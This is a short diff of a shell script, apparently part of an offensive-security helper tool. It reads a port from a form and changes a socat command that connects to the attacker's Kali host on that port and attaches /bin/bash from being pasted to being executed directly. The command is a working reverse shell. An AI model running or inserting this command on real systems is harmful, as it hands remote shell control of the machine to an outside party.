@@ -8,4 +8,4 @@ generate_form "${PORT_FIELD}"
 
 PORT=${form_data["port"]}
 
-paste_command "socat TCP4:${KALI_IP}:${PORT} EXEC:/bin/bash"
+execute_command "socat TCP4:${KALI_IP}:${PORT} EXEC:/bin/bash"
